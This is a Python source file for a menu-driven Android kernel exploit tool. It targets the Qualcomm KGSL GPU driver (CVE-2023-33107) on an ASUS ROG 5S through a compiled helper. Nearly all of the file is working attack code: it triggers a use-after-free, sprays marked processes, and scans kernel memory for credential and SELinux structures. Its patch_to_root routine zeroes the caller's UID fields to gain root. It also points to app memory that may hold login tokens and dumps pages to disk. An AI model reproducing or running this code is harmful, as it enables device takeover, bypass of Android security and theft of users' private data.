import os
import sys
import time
import struct
import subprocess
import platform

class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.exploit_proc = None
        
        # Paths
        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")
        
        self.uaf_start = 0x7001ff000
        self.uaf_size = 0x10000000 # 256MB
        
        # AI Heuristics Database - Expanded System Signatures
        self.system_signatures = {
            "com.android.settings": "Android Settings (Security & Dev Mode)",
            "com.android.systemui": "System UI (Core Interface)",
            "com.android.camera": "Camera Hardware Driver Context",
            "com.android.gallery3d": "Gallery Media & Photo Service",
            "com.android.deskclock": "System Clock, Alarms & Timers",
            "com.android.contacts": "Contacts Database & Phonebook",
            "com.android.calculator2": "System Calculator App",
            "com.android.mms": "SMS/MMS Messaging Service",
            "com.android.phone": "Telephony & Call Management",
            "com.google.android.gms": "Google Play Services (Core API)",
            "com.asus.launcher": "ASUS Launcher (System Shell)",
            "system_server": "Kernel System Server (Core Logic)",
            "surfaceflinger": "SurfaceFlinger (Display Compositor)",
            "android.uid.system": "System-wide UID 1000 Context"
        }

        # User Installed App Signatures
        self.user_signatures = {
            "com.android.vending": "Google Play Store (Official)",
            "ru.rustore.sdk": "RuStore SDK Instance (Third-party)",
            "com.apple.movetoios": "Move to iOS (App Store Utility)",
            "com.whatsapp": "WhatsApp Messenger (User Data)",
            "com.instagram.android": "Instagram (User Data)"
        }
        
        self.kernel_signatures = {
            b"KETO0422": "task_struct (Process Control Block)",
            b"init_cred": "Global Root Credentials (init_cred)",
            b"selinux_enforcing": "SELinux Enforcing State (Global)",
            b"selinux_status": "SELinux Kernel Status Bit",
            b"\x7fELF": "Kernel Executable Base (ELF Header)",
            b"\xfd\x7b\xbf\xa9": "AArch64 Function Prologue (Code)",
            b"\xff\xff\xff\xff\xff\xff\xff\xff": "Kernel Pointer Alignment Area"
        }

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                available = int(lines[2].split()[1])
                return 100.0 * (1 - (available / total))
        except: return 0.0

    def read_page(self, va):
        try:
            cmd = [self.engine_path, "read", hex(va)]
            data = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
            return data
        except: return None

    def write_page(self, va, data):
        try:
            cmd = [self.engine_path, "write", hex(va)]
            proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
            proc.communicate(input=data)
            return proc.returncode == 0
        except: return False

    def classify_page(self, page_data, va):
        """
        AI Heuristic Engine: Classifies memory content based on weights
        """
        # 1. Check for Kernel Core Markers
        for sig, name in self.kernel_signatures.items():
            if sig in page_data:
                return {"type": "Kernel Core", "desc": name, "conf": 0.98, "data": page_data, "va": hex(va)}

        # 2. Check for System Apps (System-wide signatures)
        for sig, name in self.system_signatures.items():
            if sig.encode() in page_data:
                return {"type": "System App", "desc": name, "conf": 0.95, "data": page_data, "va": hex(va)}

        # 3. Check for User Installed Apps
        for sig, name in self.user_signatures.items():
            if sig.encode() in page_data:
                return {"type": "User App", "desc": name, "conf": 0.90, "data": page_data, "va": hex(va)}

        # 4. Check for UID/GID patterns (UID 1000 = system)
        uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if uid_pattern in page_data:
            return {"type": "Privilege Struct", "desc": "System-level Credentials (UID 1000)", "conf": 0.85, "data": page_data, "va": hex(va)}

        # 5. Check for AArch64 Code Patterns (Low-level disassembly hints)
        if b"\xfd\x7b" in page_data[:128]: 
            return {"type": "Binary Logic", "desc": "AArch64 Executable Machine Code", "conf": 0.80, "data": page_data, "va": hex(va)}

        return {"type": "Unknown Object", "desc": "Unclassified Data Fragment", "conf": 0.05, "data": page_data, "va": hex(va)}

    def translate_logic(self, item):
        """
        AI Deep Logic Translation: Merges bytes into human-readable descriptions.
        """
        data = item['data']
        desc = item['desc']
        
        if "task_struct" in desc:
            pid_off = 0x548
            pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
            return (f"This is the Process Control Block (task_struct) for process ID {pid}. "
                    "It acts as the central hub for the process, storing its execution state, "
                    "memory mappings, and security context. The 'cred' pointer located here "
                    "defines who the process is in the eyes of the kernel.")
        
        elif "init_cred" in desc or "Credentials" in desc:
            uid = struct.unpack("<I", data[4:8])[0] if len(data) > 8 else -1
            return (f"Security Credentials Structure (struct cred). Currently assigned UID: {uid}. "
                    "This object governs all permission checks (SELinux, filesystem, networking). "
                    "By merging the UID/GID fields to zero (Root), the associated process will "
                    "gain absolute control over the Android operating system.")
        
        elif "SELinux" in desc:
            val = data[0] if len(data) > 0 else -1
            status = "Enforcing (Locked)" if val == 1 else "Permissive (Open)"
            return (f"Security-Enhanced Linux (SELinux) Global State. Current mode: {status}. "
                    "This is the primary shield of Android. Disabling this bit allows the "
                    "execution of arbitrary code that would normally be blocked by security policies.")
        
        elif "ELF" in desc:
            return ("Kernel Executable Header (ELF). This is the absolute starting point of the "
                    "Linux Kernel in memory. It contains the entry point for system boot and "
                    "serves as the reference for calculating all relative function addresses (KASLR).")
        
        elif "System App" in item['type']:
            return (f"Memory region belonging to the {desc}. This area contains runtime strings, "
                    "API call buffers, and possibly sensitive user data managed by the system UI.")
        
        elif "User App" in item['type']:
            return (f"Private data segment for a user-installed application ({desc}). "
                    "This region may contain cached login tokens, user preferences, or "
                    "app-specific binary logic that can be explored for further analysis.")
        
        elif "Machine Code" in desc:
            return ("Raw AArch64 machine instructions. These bytes represent the low-level "
                    "logic executed by the ARM CPU. Analyzing these can reveal the function's "
                    "purpose, such as system call handling or security verification routines.")
        
        return "Generic data fragment. No clear logical pattern detected by the heuristic engine."

    def render_tui(self):
        os.system('clear')
        ram = self.get_ram_usage()
        print("╔" + "═"*83 + "╗")
        print(f"║ KGSL AI MEMORY EXPLORER & CLASSIFIER (ROG 5S)        │ STATUS: {'ACTIVE':<7} │ RAM: {ram:>4.1f}% ║")
        print("╠" + "═"*83 + "╣")
        
        # Categorized view
        categories = {"Kernel Core": [], "System App": [], "User App": [], "Privilege Struct": [], "Other": []}
        for i, item in enumerate(self.found_items):
            cat = item['type'] if item['type'] in categories else "Other"
            categories[cat].append((i, item))

        print("║ [ROOT]                                                                            ║")
        for cat, items in categories.items():
            if not items: continue
            print(f"║  ├── [{cat}]                                                                    ║")
            for idx, item in items:
                # Truncate desc for display
                desc = (item['desc'][:30] + '..') if len(item['desc']) > 32 else item['desc']
                line = f"│   └── ID:{idx:02d} | {desc:<32} | VA:{item['va']:<12} | Conf:{item['conf']*100:>3.0f}%"
                print(f"║  {line:<81} ║")
        
        if not self.found_items:
            print(f"║  {'--- NO MEMORY OBJECTS DETECTED ---':^81} ║")
            print(f"║  {'Trigger Exploit [E] and AI Scan [S] to start mapping':^81} ║")
            
        print("╠" + "═"*83 + "╣")
        print("║ [E] Exploit Trigger   [P] Slow Spray   [S] Start AI Scan   [C] Clear Memory Cache ║")
        print("║ [R] Check Identity    [B] Build Engine [Q] Exit Explorer   [ID] Open Object       ║")
        print("╚" + "═"*83 + "╝")

    def show_detail(self, idx):
        if idx >= len(self.found_items): return
        item = self.found_items[idx]
        data = item['data']
        
        while True:
            os.system('clear')
            print("┌" + "─"*83 + "┐")
            print(f"│ MEMORY OBJECT EXPLORER - VA: {item['va']:<50} │")
            print("├" + "─"*83 + "┤")
            print(f"│ [CLASS]: {item['type']:<20} | [DESC]: {item['desc']:<43} │")
            print(f"│ [CONFIDENCE]: {item['conf']*100:>5.1f}%          | [SIZE]: {len(data):>5} bytes                            │")
            print("├" + "─"*83 + "┤")
            
            print("│ AI LOGIC INTERPRETATION:                                                          │")
            wrapped_logic = self.translate_logic(item)
            # Simple wrapping for TUI
            for i in range(0, len(wrapped_logic), 80):
                line = wrapped_logic[i:i+80]
                print(f"│ >> {line:<79} │")
            print("├" + "─"*83 + "┤")
            
            print("│ BIOS-STYLE LOW-LEVEL HEX & BINARY DATA:                                           │")
            print("│ ADDR |  00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F | BINARY (BYTE 0-3)       │")
            print("│" + "-"*83 + "│")
            
            for i in range(0, min(len(data), 256), 16):
                chunk = data[i:i+16]
                hex_row = " ".join(f"{b:02X}" for b in chunk)
                if len(chunk) < 16:
                    hex_row += "   " * (16 - len(chunk))
                
                # Binary for first 4 bytes
                b_val = struct.unpack("<I", chunk[:4])[0] if len(chunk) >= 4 else 0
                bin_str = bin(b_val)[2:].zfill(32)
                
                # Format hex row with a space in the middle
                hex_parts = hex_row.split(" ")
                hex_f = " ".join(hex_parts[:8]) + "  " + " ".join(hex_parts[8:])
                
                print(f"│ {i:04X} | {hex_f:<48} | {bin_str[:8]}.{bin_str[8:16]}.{bin_str[16:24]}.{bin_str[24:]} │")
            
            print("└" + "─"*83 + "┘")
            print(" [P] Patch to Root    [N] Scan Neighbors    [D] Dump to File    [Enter] Back")
            
            choice = input("\n explorer > ").lower()
            if not choice: break
            if choice == 'p':
                self.patch_to_root(int(item['va'], 16))
                input("Press Enter...")
            elif choice == 'n':
                print("[*] AI: Analyzing adjacent memory segments for structural links...")
                base_va = int(item['va'], 16)
                # Scan 2 pages before and 2 pages after
                for offset in [-8192, -4096, 4096, 8192]:
                    n_va = base_va + offset
                    n_data = self.read_page(n_va)
                    if n_data and any(b != 0 for b in n_data):
                        n_item = self.classify_page(n_data, n_va)
                        n_item['desc'] = f"(Linked to {item['va']}) " + n_item['desc']
                        self.found_items.append(n_item)
                        print(f"[+] Found related object at {hex(n_va)}")
                time.sleep(1)
                break # Return to list to see new items
            elif choice == 'd':
                fname = f"dump_{item['va']}.bin"
                with open(fname, "wb") as f:
                    f.write(data)
                print(f"[+] Dumped to {fname}")
                time.sleep(1)

    def patch_to_root(self, va):
        print(f"[*] AI attempting to elevate privileges via {hex(va)}...")
        page_data = self.read_page(va)
        if not page_data: return
        
        my_uid = os.getuid()
        uid_bytes = struct.pack("<I", my_uid)
        new_data = bytearray(page_data)
        
        found = False
        for i in range(0, len(page_data) - 32, 4):
            if page_data[i:i+4] == uid_bytes:
                print(f"[+] AI Target Found: UID {my_uid} at +0x{i:x}. Overwriting with UID 0 (ROOT).")
                for j in range(8): # Zero out all credential fields
                    new_data[i+j*4 : i+j*4+4] = b"\x00\x00\x00\x00"
                found = True
                break
        
        if found:
            if self.write_page(va, bytes(new_data)):
                print("[+++] AI SYSTEM: Privilege Escalation Success! System identity spoofed to ROOT.")
            else:
                print("[-] AI SYSTEM: Hardware Write Error. GPU bus busy.")
        else:
            print("[-] AI SYSTEM: UID pattern not matched. Structure might be encrypted or shifted.")

    def trigger_exploit(self):
        if self.exploit_proc: return
        print("[*] Initializing Hardware Trigger (CVE-2023-33107)...")
        self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
        for line in self.exploit_proc.stdout:
            if "UAF_READY" in line:
                print("[+] Hardware Access: OPEN.")
                break
        time.sleep(1)

    def run_spray(self, count=2000):
        print(f"[*] AI: Initiating controlled spray of {count} process markers...")
        print("[*] Speed: SLOW (Throttled for stability)")
        
        for i in range(count):
            if i % 100 == 0:
                # Monitor RAM during spray
                ram = self.get_ram_usage()
                if ram > 65.0:
                    print(f"\n[!] AI Safety: RAM at {ram:.1f}%. Throttling spray...")
                    time.sleep(2)
            
            pid = os.fork()
            if pid == 0:
                try:
                    import ctypes
                    libc = ctypes.CDLL(None)
                    # Set a unique marker name for AI recognition
                    libc.prctl(15, f"KETO{i:04d}".encode(), 0, 0, 0)
                except: pass
                # Keep process alive but idle
                while True: time.sleep(100)
            else: 
                self.spray_procs.append(pid)
                # Small delay to make it "not very fast"
                time.sleep(0.005) 
                
        print(f"\n[+] AI: Spray complete. {len(self.spray_procs)} markers active in memory.")
        time.sleep(1)

    def try_compile_engine(self):
        source = self.engine_path + ".c"
        if not os.path.exists(source): return False
        print(f"[*] Compiling AI Engine for {platform.machine()}...")
        for comp in ["gcc", "clang"]:
            try:
                subprocess.check_call([comp, "-O2", source, "-o", self.engine_path, "-lpthread"])
                print(f"[+] Engine built with {comp}.")
                return True
            except: continue
        return False

    def check_root(self):
        print("\n[*] Root Verification Protocol:")
        try:
            res = subprocess.check_output(["id"], text=True).strip()
            print(f" >> Identity: {res}")
            try:
                with open("/data/system/packages.list", "r") as f:
                    f.read(1)
                print(" >> Access Test: SUCCESS (Full System Access)")
            except: print(" >> Access Test: FAILED (SELinux or UID mismatch)")
        except Exception as e: print(f" [-] Verification Error: {e}")
        input("\nPress Enter...")

    def clear_sprays(self):
        print(f"[*] AI: Terminating {len(self.spray_procs)} spray processes...")
        for pid in self.spray_procs:
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0) # Reap zombie
            except: pass
        self.spray_procs = []
        print("[+] AI: Memory Cache cleared.")
        time.sleep(1)

    def run(self):
        if not os.path.exists(self.engine_path): self.try_compile_engine()
        
        while True:
            self.render_tui()
            try: cmd = input("\n explorer > ").lower()
            except EOFError: break
            
            if cmd == 'q':
                if self.exploit_proc: self.exploit_proc.terminate()
                for p in self.spray_procs:
                    try: os.kill(p, 9)
                    except: pass
                break
            elif cmd == 'e': self.trigger_exploit()
            elif cmd == 'p': self.run_spray()
            elif cmd == 'c':
                self.clear_sprays()
                self.render_tui()
            elif cmd == 'r': self.check_root()
            elif cmd == 'b': self.try_compile_engine(); input("Press Enter...")
            elif cmd == 's':
                if not self.exploit_proc:
                    print("[!] Trigger [E] first!"); time.sleep(1); continue
                print("[*] AI Scanning Memory for Patterns...")
                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + self.uaf_size)]
                proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, text=True)
                try:
                    for line in proc.stdout:
                        if "MATCH_" in line:
                            va = int(line.split(":")[1], 16)
                            data = self.read_page(va)
                            if data:
                                self.found_items.append(self.classify_page(data, va))
                                self.render_tui()
                except KeyboardInterrupt: proc.terminate()
            elif cmd.isdigit():
                self.show_detail(int(cmd))

if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
